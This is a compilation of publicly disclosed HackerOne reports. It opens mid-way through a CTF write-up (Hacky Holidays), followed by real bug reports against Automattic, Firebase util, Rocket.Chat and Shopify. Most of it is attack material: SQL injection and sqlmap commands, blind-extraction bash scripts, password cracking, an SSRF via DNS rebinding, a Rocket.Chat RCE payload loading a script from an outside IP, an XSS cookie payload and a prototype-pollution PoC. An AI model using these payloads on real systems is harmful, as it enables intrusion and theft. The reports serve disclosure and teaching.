curl -H "cookie: $cookie" 'https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709' -s -k | egrep 'flag\{[a-zA-Z0-9\-]*}' -o | sed 's/^/Flag 12\: /';
```

Save it in `get-all-flags.sh`, run `chmod +x get-all-flags.sh; ./get-all-flags.sh`. If all works as expected, this should be the output:

{F1130220}

------------------------

## Flag 1 - robots.txt leak

The first flag was found in the /robots.txt directory by common crawl of burp-suite. Once we navigate to it, there is the flag and a hint for the second one:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```
###### note:  In general, this file contains endpoints that that might or might not disclose sensitive endpoints. 

-----------------

## Flag 2 - Into the DOM

From the `/robots.txt` file, we find out of `/s3cr3t-ar3a`. Once we visit it, we note that the site is under construction and there isn't anything sensitive at first look but there is a hint `...If you're allowed access you'll know where to look for the proper page!`.

So we check the source-code and nothing, then we use the inspect element and there is the flag hidden inside a div tag:

```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
```

----------------------------------


## Flag 3 - who is always the first user?

This flag is located in `/people-rater` where Grinch rates people. Every time we click to know the Grinch's rating of someone, the following GET request is sent to the server:

```
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
{redacted}
````
The value of the ID is base64 encoded. Once decoded we notice that it includes a number: `{"id":2} ` .  If we increase that number we will get the others people's rating, but trying the number 1, gives but the rating of Grinch itself (the first user), with the third flag in the response too.

```
GET /people-rater/entry?id=eyJpZCI6MX0g HTTP/1.1
Host: hackyholidays.h1ctf.com
```
```json
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

------------------ 


## Flag 4 - improper access to the API

We start this adventure in `/swag-shop`, it is a broken shop with 3 items and if you try to purchase any of them you get a login prompt which stops you from continuing. I try searching for sqli, guessing the credentials (the usual), but nothing worked.

Then I moved to the api (since we didn't have API endpoints before) and start brute-forcing it. I didn't get anything from the burp wordlist so then I tried the [seclists](https://github.com/danielmiessler/SecLists)'s ones from  Daniel Miessler and was able to find 2 interesting api endpoints: `/sessions` and `/user`.

In `/sessions` we find 8 base64 encoded IDs that look interesting, once I decoded one by one I noticed that the larger one contained a random user ID.

```json
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

Now we go back to the `/user` endpoint that was returning `"error":"Missing required fields"` meaning something was missing there (the user ID). So after playing a bit and trying different things, I finally came across that that you had to add it with the parameter name `uuid` instead of `id`
 (took me a lot longer than expected).

```
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
{redacted}
```

```json
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```
-----------------


## Flag 5 - Not so secure login

This challenge starts at `/secure-login`. We encounter a login panel and nothing else. As the usual, I check for sqli, and default creds but unfortunately it didn't work.

If we look at the POST request response, we will notice the server is telling us that the username is incorrect `Invalid Username`, giving us an idea that we can brute-force a little bit to try find the username and then the password.

So again we use a [seclist](https://github.com/danielmiessler/SecLists)  wordlist and quickly find out the username is `access`, and later found that the password is `computer`.

Ok and the flag? Well it is not over.

Now we are authenticated in the site with the following cookie:
`securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D`

If we decode the value we notice 2 things:
`{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":falsZX0%`

- We are not the admin
- The syntax is broken so we need to fix it

We change `false` to `true` and fix the syntax and now we are the admin and we are able to download a zip file called `my_secure_files_not_for_you.zip`. This file is password protected so we have to brute-force it.

For this I used john the ripper with a bash script I found in the wild and another wordlist from [seclists top-10kpasswords](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt)

```bash
#!/bin/bash
echo "ZIP-JTR Decrypt Script";
if [ $# -ne 2 ]
then
echo "Usage $0 <zipfile> <wordlist>";
exit;
fi
unzip -l $1
for i in $(john --wordlist=$2 --rules --stdout) 
do
 echo -ne "\rtrying \"$i\" " 
 unzip -o -P $i $1 >/dev/null 2>&1 
 STATUS=$?
 if [ $STATUS -eq 0 ]; then
 echo -e "\nArchive password is: \"$i\"" 
 break
 fi
done
````

So we run `./script.sh my_secure_files_not_for_you.zip wordlist.txt` and in less than few minutes we get that the password is "hahahaha" and inside the file we find the flag: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`.

----------------------------------


## Flag 6 - Regex nightmare

In this challenge we are in `/my-diary/?template=entries.html` and we only control the value of this parameter. After some time of fuzzing, I found out that the file `index.php` is accessible to the public so we browse to it.

The page is blank but in the source code we can see the filter the server is doing preventing malicious hackers to access admin.php: `view-source:https://hackyholidays.h1ctf.com/my-diary/?template=index.php`

So unless you are a genius, the fastest way to solve this is by trying and trying until you get it, so that's what I did.

I used a online php editor to try and see how the regex was working and how to bypass it https://paiza.io/es/projects/new. After a few minutes I came to a solution (probably not the cleanest one, but works):

```php
<?php

    $page = 'secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php';
    
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    $page = str_replace("admin.php","",$page);
    $page = str_replace("secretadmin.php","",$page);
    echo $page
?>
```
This bypasses the 3 filters and lets me access the `secretadmin.php` file containing the flag:

```
GET /my-diary/?template=secretadmin.phpadminadmin.phpsecretadmin.phpadminadmin.php.php.php HTTP/1.1
Host: hackyholidays.h1ctf.com
{redacted}
```
```html
{redacted}
<h4 class="text-center">
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
</h4>
```

---------------------------------

## Flag 7 - Access blocked content with an email template

This challenge starts in `/hate-mail-generator`. There we can see the "guess that" email, with a really weird markup:

```markdown
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

But when clicking the `preview` button both `{{template:cbdj3_grinch_header.html}}` and `{{template:cbdj3_grinch_footer.html}}` were replaced with images. 

{F1121611}

Interesting, at first look seems like server-side template injection might be possible with `{{}}` to try and read something sensitive.

After a bit of fuzzing resulting in finding https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and understanding what was happening in https://hackyholidays.h1ctf.com/hate-mail-generator/new when trying to create an email I came with the solution, but let me explain my thought process step by step.

In https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ we have 3 files. The 3 of them return code 403 when trying to read/view them directly, bue we already know the content of 2 of them because we already saw them in `https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030`. There is one last file that we didn't see yet: `38dhs_admins_only_header.html`, and that's our objective.

In `/hate-mail-generator/new` it is possible to preview the content of what we write (we can't create anything). 

The POST request body to preview goes as follow (we can url-decode and works anyway):

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=Hello{{name}}+....+whatever&preview_data={"name":"Alice","email":"alice@test.com"}
```

```
HelloAlice .... whatever
```

`{{name}}` was replaced with `Alice`, which is declared in the "preview_data" value. Changing Alice for other word and repeating the request, would also cause that word  to be replaced in `{{name}}` when previewing it.

Ok what if we try to modify those values and see what happens?

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
preview_markup=Hello+{{name}}+email:+{{email}}&preview_data={"name":"zonduu","email":"murphy@hacktheplanet.com"}
```

```
Hello zonduu email: murphy@hacktheplanet.com
```

Basically the logic is, what you declare in "preview_data" then you can call it in "preview_markup". So then we go back to `/hate-mail-generator/templates/ ` and get the name of the last file we have pending to see. This [endpoint](https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030) was useful to know how to put the correct syntax when declaring the template.

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
preview_markup={{flag}}&preview_data={"flag":"{{template:38dhs_admins_only_header.html}}"}
```

{F1121646}

-------------------------------------------------------

## Flag 8 - Github creds leak

We start this challenge in `/forum/`. We have 2 Posts that we can see and one private with the message `You need to be an admin to view these posts`.

A quick look-up throw all application and after failed attempts of IDORs like /forum/{1-200} or guessing the credentials of Grinch or Max I came across with the admin login interface https://hackyholidays.h1ctf.com/forum/phpmyadmin after a quick fuzz with the burp's content discovery wordlist.

At this point I was really stuck, because I couldn't guess the default creds of `phpmyadmin`, so I asked for a hint to a friend and he sent me a photo of the github logo...

A quick google search revealed that @Adam (the creator of this whole challenge) had a github repo with source code of this application https://github.com/Grinch-Networks/forum. I don't know much php so this step took me longer than expected but in this commit: https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae the credentials to log in are disclosed, exactly in this line:

`self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );`

So we go back to https://hackyholidays.h1ctf.com/forum/phpmyadmin, log in with the username `forum` and password `forum` and we are in.

There we have the 2 available usernames (grinch and max), and their passwords that are md5 encrypted:

{F1122758}

Ok no problem, I downloaded [hashcat](https://hashcat.net/hashcat/) in my new notebook and [rockyou.txt](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz) wordlist and run it. After 3 seconds, hashcat tried the +14,3 Million passwords but couldn't get it. At this time I got a bit confused because I thought that I might have to do a complete brute-force (letter by letter, without wordlist).

Lucky for me @Adam commented this on the official Hackerone Discord. 

{F1130253}

So I added a hashcat rule: {F1122762} that takes every single line of you wordlist and makes it case sensitive. If your wordlist has the word `abc`, this rule will make hashcat try `Abc`, `aBc`, `abC`, `ABC`, etc.

```powershell
.\hashcat.exe -m 0 -a 0 -o out .\hash .\rockyou.txt --force -potfile-disable -r toggle5.rule --workload-profile=3
```

and a few seconds later I got the password which was `BahHumbug` and then in the private post there was the flag:

{F1122783}

----------------------- 

## Flag 9 - Second order SQLi

We start this challenge in `/evil-quiz`.  We have a quiz that receives input in the field `name`, and if we click enter, it makes a POST request to the server like this:

```
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Cookie: session=b519f0f0b323624b25663d3565cc8c2a

name=asdasd
```

The next request is the actual 3 question quiz (which has no effect at all, so we don't talk about it) and then we have the `/evil-quiz/score` endpoint that will tell you **how many people made the quiz with your name**.

So after quite a lot of time manually fuzzing and trying to automate a bit of it, we get to know that the server is vulnerable to SQLi, a second order SQLi...

If the server receives a true statement like `99' OR 1=1-- -` then the server will return a lot of users in the response, like for example: 

`There is 565042 other player(s)`

If we send a false statement like `99' OR 5=1-- -` then the server will return (in the second request, remember the quiz one doesn't matter):

`There is 0 other player(s)`

So well, now we can either make our own script, and start digging into the database part by part or we can use a tool designed to do this job easier: [sqlmap](http://sqlmap.org/)

To run it smoothly  and without false positives, is important to run it with 1 thread in this case. Multiple threads would cause false positives as each payload depends on a second request to see if it is a false/true statement.

We save request 1 in req1 file, and the second request in req2. We need to tell sqlmap where request 1 is with the `-r` flag, and where the second request is with `--second-req` flag. Threads 1, lvl 3 and risk 3. Then I added the `--regexp` flag which tells sqlmap when it is a **true** statement, and the regex is to math "There is {more than 2 digits here}". `--force-ssl` is important because sqlmap makes Plain HTTP requests as default and `--technique=B` because we know it is a boolean SQL injection.

The final command to extract the username and password looks like this:

`python.exe .\sqlmap.py -r req1 --second-req req2 --threads 1 --level 3 --risk 3 --regexp="There is [0-9]{1,}[^ ]" -p name --random-agent --proxy https://127.0.0.1:8080 --force-ssl --technique=B -D quiz -T admin --dump`

{F1127472}

Giving me the credential pair of:  `admin/S3creT_p4ssw0rd-$`, then we log in and there is the flag

{F1130243}

---------------------------------------

## Flag 10 - Code review

The flag 10 hunting starts in `/signup-manager/`. After spending some time wasting my time fuzzing, I found out that in the source-code there is a block commented:

`<!-- See README.md for assistance -->`

We browse to `signup-manager/readme.MD` and it automatically downloads a .md file. It points out some interesting files, but the most important one is definitely:  `signupmanager.zip`

In the zip file, we find 4 .php files that aren't important except for index.php that has actually valuable php code to review.

Not going to lie, this was a bit hard for me because I don't like/do code review, and I don't know php code apart from the basics, so I didn't know what to look for.

But in summary, the age parameter when signing up  goes throw `intval()` with a maximum of 3 characters. One of the last versions of php makes intval() function (which gets the base number of the number provided) make a bigger number.

If we provide '1e5' in the age input, it will make as output 100000 and because the server is expecting just 3 numbers or less, it will cause an overflow when creating the user details.

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Upgrade-Insecure-Requests: 1

action=signup&username=fwefgergeg&password=ergegerg&age=1e6&firstname=gergerg&lastname=YYYYYYYYYYYYYYYYYYY
```

The above request will add one or more 'Y' in the admin parameter, making us admin of the website and getting the flag.

{F1130267}

-----------------

## Flag 11 - Manual SQLi and more

One of the hardest challenge, if not the hardest one. We start this challenge in `/r3c0n_server_4fdk59` where there are 3 albums that when clicking them would make the following GET request:

```
GET /r3c0n_server_4fdk59/album?hash=jdh34k HTTP/1.1
Host: hackyholidays.h1ctf.com
```

After quite a long time fuzzing for directories and trying a lot of things, I noticed the `hash` parameter is vulnerable to SQLi:

A valid statement would result in a 404 response, while a false statement would return code 200

- `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'+OR+1=1--+-` - code 404
- `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'+OR+1=2--+-` - code 200

So I fire up sqlmap and dump the entire DB but there was no flag or anything that I could use to continue with the challenge. Now as I am a sqlmap type of user instead of manually exploiting, I had quite a hard time.

When we view an album, it shows images that are called with the following HTML code:

```html
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9">
```
 
and if decoded the data's value looks like this:

```json
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

The server is generating an auth code that is bidden to the the file that we want to read. We can't modify the file and try to get arbitrary files because the auth code would be invalid and the server actually validates it perfectly. We will come back to this later.

###### note: This would be a really good vector to try and find vulnerabilities in a real app. Changing the path, deleting the auth code, modifying it, etc.

We know there is an api endpoint because it is mentioned when we arrived at the page:

`We are currently developing an API, apologies for anything that doesn't work quite right`

So we go to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api and start trying to find possible endpoints in `/r3c0n_server_4fdk59/api/*` fuzzing a lot to see if we can find something. We quickly notice that we get code 401 blocking us to access anything, but on this I found a few probably unintended "bugs" that I wanted to share for people reading the report.

When trying to access normal endpoints like `/api/anything` we get 401.  Basically`[a-zA-Z0-9]` returns code 401.

This restriction doesn't apply when we go 2 or more directories depth like `/r3c0n_server_4fdk59/api/abc/here` or when we add a special character in first path like `/r3c0n_server_4fdk59/api/asdasd.` or `/r3c0n_server_4fdk59/api/asdasd!` so I spent a lot of time trying to find a filter bypass to access some random api endpoints like `/api/abc/../FUZZ` or `/api/./FUZZ` but they all were dead ends.

Back to the SQL injection, it is possible to force the server to create an auth code for us, therefore allowing us to fuzz the api for endpoints.

Injecting the following query would make the server create an auth code for the specific file/path we want to see:

`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop'+UNION+SELECT+"2'+UNION+SELECT+1,1,'../api/whatever'+--+-",'12',1--+--`

This would create an image with  in the response, with the '/api/whatever' path and the auth code to view the specified directory.

With this in mind, I wrote a script that would fuzz the api endpoint, grab the urls generated by the server in the response and then make GET request to check if any of them is different from the usual response.

```bash
while read line; do
        curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/${line}%27+--+-%22,%2712%27,1--+-" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/' | anew valid-endpoints > /dev/null;
done < api.txt

while read line; do
        curl -s -k "${line}" > output;
        if cat output | grep 'Invalid content type detected' > /dev/null; then
                echo $line;
        fi
done < valid-endpoints
```

After running it, I found 2 endpoints that returned a different response: `/api/user` and `/api/ping`. But both of this urls were returning:

```
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
```

`Invalid content type detected`. Since it is expecting an image.

It doesn't end here! Back to the SQL injection.

It is possible to make a boolean based SQLi to guess the username and password via the username and password parameters of the `/api/user` endpoint. When providing a valid letter/number followed by a `%` the server would return `Invalid content type detected` in the response.

I made the following bash script based on that logic to extract the username and later the password:

```bash

# chr function to get ascii chars
chr() {
  [ "$1" -lt 256 ] || return 1
  printf "\\$(printf '%03o' "$1")"
}

while true
do
        for x in {48..57} {97..122};
        do
                letter=$(chr $x);
                #letter=$(urlencode "$letter");
                new="$dis";
                url=$(curl -s -k "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jasda59grop%27+UNION+SELECT+%222%27+UNION+SELECT+1,1,%27../api/user?username=${new}${letter}%25%27+--+-%22,%2712%27,1--+--" | grep '" src=".*"' -o | sed 's/" src="//' | sed 's/"//' | grep -v 'DM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMT' | sed 's/^/https\:\/\/hackyholidays.h1ctf.com/');

                curl "$url" > output 2> /dev/null;
                if cat output | grep 'Invalid content type detected' > /dev/null; then dis="${dis}${letter}"; echo -ne "\r$dis"; fi
        done
done
```

```
zonduu@localhost:~/h1-ctf# ./2flag11.sh 
grinchadmin
```

Now we modify the script and add the username we just found, and try to get the password:  `?username=grinchadmin%26password=${new}${letter}%25`

```
zonduu@localhost:~/h1-ctf# ./2flag11.sh 
s4nt4sucks
```

With the username and password we found we log in and there is the flag:

{F1130176}

----------------

## Flag 12 - The salted hash

We start this challenge where the last one ended `/attack-box`. There are 3 target IPs and we can "launch a DDoS attack" to the Santa's servers and when we try to launch an attack the following request is sent to the server:

```
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
```

If  base64 decode it, it shows the destination IP, and a md5 hash:

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

As soon as I saw this I knew I had to change the IP to localhost so we can take down the Grinch, but the server stops us because it validates the hash.

So after a pretty long time of pointless brute-forcing of the hash and some help of friends it is possible to decrypt it and find the salt of the hash. We need to guess that the IP is part of the hash and that the salt is something possible to brute-force from a wordlist (as direct brute-force would take too long for a ctf).

Saved the hashes with their IPs in a file `hashes`:

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
```

And then used hashcat with rockyou wordlist: `hashcat -a0 -m 10 -O hashes rockyou.txt --potfile-disable -o out`

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
```

The server is using the salt `mrgrinch463` in the sense of salt-password, therefore it is possible to change to a desired IP of our choice and make the correct md5 hash so the server would accept it (it is possible to make any hash of any IP as we know the only salt the server uses).

I start trying payloads to try hit localhost but the server was making proper validation and resolving the hosts so `localtest.me` is blocked as well as all the other payloads of this list https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

It is also blocking domains or IPs if they contain any special character like `@/:`.

All payloads failed until the DNS rebinding  payload. There are multiple ways of doing this but I used the subdomain `7f000001.c0a80001.rbndr.us` that will resolve randomly to `127.0.0.1` or `192.168.0.1`.

After 2 tries, I was able to hit `192.168.0.1` in the filter check and `127.0.0.1` when the DDoS attack was launched and took down the Grinch Networks server. It might work on the first try or might take a couple of tries.

Payload:

- https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9

```json
{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}
```

If the attack is successful, we take down the Grinch Network server and get redirected to https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 and complete the CTF.

{F1130195}

---------------------------

## Impact

- The sum of multiple vulnerabilities resulted in the ability to take down Grinch Networks.

Great CTF and amazing work @Hacker0x01 & @adamtlangley.

Have a nice end of the year, zonduu.

---

### [Writeup Submission](https://hackerone.com/reports/1068880)

- **Report ID:** `1068880`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @h3x0ne
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:05:56.913Z
- **CVE(s):** -

**Vulnerability Information:**

The Write-Up will be published within the next hours latest till Dec. 31st 12:00 PST under https://blogs.tippexs.io

User: h4ck4r0ne
Pass: s4nt4sucks

Let me know if I need to submit anything else. I have started crafting an PDF but it become that huge that I have decided to create a complete new blog for it.

## Impact

N.A.

---

### [SQL Injection Union Based](https://hackerone.com/reports/1046084)

- **Report ID:** `1046084`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Automattic
- **Reporter:** @fuzzme
- **Bounty:** - usd
- **Disclosed:** 2021-01-01T09:19:02.827Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Hello, 

I have found a SQL Injection Union Based on `https://intensedebate.com/commenthistory/$YourSiteId `
The `$YourSiteId` into the url is vulnerable to SQL Injection.

## Steps to reproduce

1.  Logging into `https://intensedebate.com`

2. After create your own site on `https://intensedebate.com/install` and follow all steps

3. Now you need to know your site id, to get then you need go to `https://intensedebate.com/user-dashboard` and you can see on the right side of the page your site list, choice your site and click to the link `Overview`.
You will be redirected to `https://intensedebate.com/dash/$YourSiteId`.

4. Now you have your site id,  go to the vulnerable URL with your site id `https://intensedebate.com/commenthistory/$YourSiteId`.
 
5. Now Trigger the SQL Injection with this following link `https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23` (!) You need to do this with your own site id (!)

6. Now you can see `10.1.32-MariaDB` on the page.

## POC 

@@VERSION

{F1096977}

current_user()

{F1096976}

Video POC

## IMPORTANT
Can you see my comment into [#1044698](https://hackerone.com/reports/1044698) ??
 And I no longer want to put all SQL Injection issues on into my initial report [#1042746](https://hackerone.com/reports/1042746), because i don't win any reputations 

Thank you,

Fuzzme.

## Impact

Full database access holding private user information and Reflected Cross-Site-Scripting

---

### [Site-wide CSRF at Atavist ](https://hackerone.com/reports/951292)

- **Report ID:** `951292`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:21:01.478Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team,
I have a Atavist Magazine account. And there are no CSRF tokens on account settings.

For example ;
- When changing email (there is a user ID but they are sequential) : {F936597}

- Deleting credit card : {F936618}

- Cancelling subscription : https://magazine.atavist.com/cms/ajax/cancel_subscription.php?product_id=com.theatavist.atavist.subscription.membership - this endpoint sends an email with `We'll Miss You` title, but it doesn't cancel the subscription. (this is not related to CSRF, there is a CSRF but the endpoint is weird :-D)

I didn't want to create report for each endpoint, because this is a site-wide issue. I think you can add a header for root fix.

## Impact

Site-wide CSRF 

Thanks,
Bugra

---

### [[@firebase/util] Prototype pollution](https://hackerone.com/reports/1001218)

- **Report ID:** `1001218`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Node.js third-party modules
- **Reporter:** @d3lla
- **Bounty:** - usd
- **Disclosed:** 2020-11-17T17:42:42.628Z
- **CVE(s):** -

**Vulnerability Information:**

# Module

**module name:** `@firebase/util`
**version:** `0.3.2`
**npm page:** `https://www.npmjs.com/package/@firebase/util`

## Module Description

NOTE: This is specifically tailored for Firebase JS SDK usage, if you are not a member of the Firebase team, please avoid using this package

This is a wrapper of some Webchannel Features for the Firebase JS SDK.

## Module Stats

[1,516,157] weekly downloads

# Vulnerability

## Vulnerability Description

I tested the [`deepCopy`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) and [`deepExtend`](https://github.com/firebase/firebase-js-sdk/blob/master/packages/util/src/deepCopy.ts) functions.

The `deepCopy` and `deepExtend` functions can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `@firebase/util` module:
    - `npm i ``@firebase/util`

Run the following poc:
```javascript
const utils = require('@firebase/util');

const obj = {};
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log("Before : " + obj.polluted);
utils.deepExtend({}, source);
// utils.deepCopy(source);
console.log("After : " + obj.polluted);

```
Output:
```console

Before : undefined
After : yes
```
{F1024346}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.11.0
- NPM VERSION: 6.14.8

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

---

### [Remote Code Execution in Rocket.Chat-Desktop](https://hackerone.com/reports/943725)

- **Report ID:** `943725`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Rocket.Chat
- **Reporter:** @sectex
- **Bounty:** - usd
- **Disclosed:** 2020-11-07T14:40:26.343Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:** Rocket.Chat-Desktop is vulnerable to remote code execution.
An attacker is able to create new BrowserWindow instances with a malicious preload script.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: < v3.0.0-develop

## Steps To Reproduce (by setting up a malicious server):
  1. Go to `Administration » Layout » Custom Scripts » Custom Script for Logged In Users`
  1. Insert the following script:
  `window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\\\45.155.173.235\\data\\cmd.js'].join(','))`
  1. Click `Save changes`
  1. Open Rocket.Chat-Desktop and connect to the server
  1. CMD.exe will pop up.

## Suggested mitigation

  * [`src » preload » jitsi.js`](https://github.com/RocketChat/Rocket.Chat.Electron/blob/develop/src/preload/jitsi.js)
  ```
  const wrapWindowOpen = (defaultWindowOpen) => (href, frameName, features) => {
       const settings = getSettings();

       features = ''; // <- should fix it

       if (settings && url.parse(href).host === settings.get('Jitsi_Domain')) {
         features = [
           features,
           'nodeIntegration=true',
           `preload=${ `${ remote.app.getAppPath() }/app/preload.js` }`,
         ].join(',');
       }

       return defaultWindowOpen.call(window, href, frameName, features);
  };
  ```

## Impact

Remote Code Execution in Rocket.Chat-Desktop

---

### [xss triggered in "myshopify.com/admin/product"](https://hackerone.com/reports/978125)

- **Report ID:** `978125`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Shopify
- **Reporter:** @jaka-tingkir
- **Bounty:** - usd
- **Disclosed:** 2020-09-15T20:30:27.321Z
- **CVE(s):** -

**Vulnerability Information:**

I tried to make a product description and add the xss script in the paragraph.

## steps for reproduction
1. create a new product
2. enter xss in the product description paragraph, such as;
`<div align =" center "data-mce-fragment =" 1 "> <img src = x onerror = prompt (document.cookie)>
<h4 dir = "ltr" data-mce-fragment = "1"> <span style = "text-decoration: underline; color: # ff2a00;"> <em> <strong> (name_product) </strong></em></span> </h4>
</div> ``

## Impact

xss can be triggered

**Summary (team):**

@jaka_tingkir discovered a bypass to an HTML sanitization function on the Collections and Products Rich Text Editor. Until recently, all reports regarding cross site scripting in the Rich Text Editor were considered a Known Issue under our program:

> - **XSS - Rich Text Editor** - Any issue related to execution of javascript in the Rich Text Editor (for example, when editing the description of a product, blog or collection, etc).

Recently we deployed an HTML sanitization function to the Rich Text Editor in specific sections of the administrative area. We then updated the exclusion to mention specific pages that are still vulnerable:

> - **XSS - Rich Text Editor** - Issues relating to execution of JavaScript in the legacy Rich Text Editor in the Legal settings, Blogs section, and Pages section of the Shopify admin.

As this exclusion states, all new reports regarding the legal settings, blogs, and pages sections will still be considered invalid and a Known Issue. New XSS reports regarding the rich text editors in the Products and Collections sections may be valid.

---

### [Takeover an account that doesn't have a Shopify ID and more](https://hackerone.com/reports/867513)

- **Report ID:** `867513`
- **Severity:** Critical
